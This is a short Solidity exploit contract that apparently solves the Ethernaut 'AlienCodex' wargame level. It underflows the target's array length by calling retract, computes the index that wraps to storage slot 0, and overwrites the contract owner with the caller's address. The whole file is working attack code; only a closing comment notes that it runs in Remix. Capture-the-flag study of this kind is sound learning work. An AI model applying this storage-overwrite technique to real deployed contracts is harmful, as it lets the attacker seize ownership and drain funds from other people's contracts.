pragma solidity ^0.8.0;

interface IAlienCodex {
    function revise(uint i, bytes32 _content) external;
    function makeContact() external;
    function retract() external;
}

contract AlienCodex {
    address level19;
    
    constructor(address _levelInstance) {
      level19 = _levelInstance;
    }
    
    function trigger () external {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
        IAlienCodex(level19).makeContact();
        IAlienCodex(level19).retract();
        IAlienCodex(level19).revise(index, myAddress);
    }
}
// Works only in Remix, the foundry cannot work with the old version of the src contract from my env
